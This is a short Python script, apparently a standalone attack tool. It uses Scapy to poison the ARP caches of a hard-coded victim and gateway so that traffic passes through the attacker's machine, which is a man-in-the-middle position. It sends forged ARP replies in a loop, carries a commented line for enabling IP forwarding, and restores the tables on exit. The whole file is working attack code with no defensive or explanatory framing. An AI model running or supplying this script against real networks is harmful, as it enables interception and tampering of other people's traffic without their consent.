from scapy.layers.l2 import ARP, getmacbyip, Ether
from scapy.all import sendp
import os
import time


victim_ip = "192.168.10.235"
victim_mac = getmacbyip(victim_ip)
spoofed_ip_origin = "192.168.10.1"
spoofed_mac_origin = getmacbyip(spoofed_ip_origin)


attacker_mac = "ff:ff:ff:ff:ff:ff"  # Replace with your machine's MAC address

# Ensure that you have IP forwarding on the attacker machine (Linux example)
# os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")

def spoof_arp(target_ip, target_mac, spoof_ip):
  # Send an ARP reply to `target_ip`, telling it that `spoof_ip`
  # is associated with the attacker's MAC address.
  # Using broadcast

  # Create an Ethernet frame with the correct target MAC address
  ether = Ether(src=attacker_mac, dst=target_mac)
  # Create the ARP packet
  arp = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip, hwsrc=attacker_mac)
  # Send combined Ethernet + ARP packet
  packet = ether / arp
  sendp(packet, verbose=False)

def restore_arp(target_ip, target_mac, source_ip, source_mac):
  # Restore the ARP table for `target_ip`, telling it that `source_ip`
  # is associated with `source_mac`.

  ether = Ether(src=attacker_mac, dst=target_mac)
  arp = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=source_ip, hwsrc=source_mac)
  packet = ether / arp
  sendp(packet, count=5, verbose=False)

def main():

  print("Starting ARP spoofing...")
  try:
    while True:
      # Tell the victim that the spoofed IP is at the attacker's MAC
      spoof_arp(victim_ip, victim_mac, spoofed_ip_origin)
      # Tell the machine we spoof that the victim is at the attacker's MAC
      spoof_arp(spoofed_ip_origin, spoofed_mac_origin, victim_ip)
      time.sleep(2)  # Repeat every 2 seconds to maintain the MITM position
  except KeyboardInterrupt:
    print("Stopping ARP spoofing and restoring ARP tables...")
    restore_arp(victim_ip, victim_mac, spoofed_ip_origin, spoofed_mac_origin)  # Original spoofed_mac_here
    restore_arp(spoofed_ip_origin, spoofed_mac_origin, victim_ip, victim_mac)   # Original victim_mac_here

if __name__ == "__main__":
  main()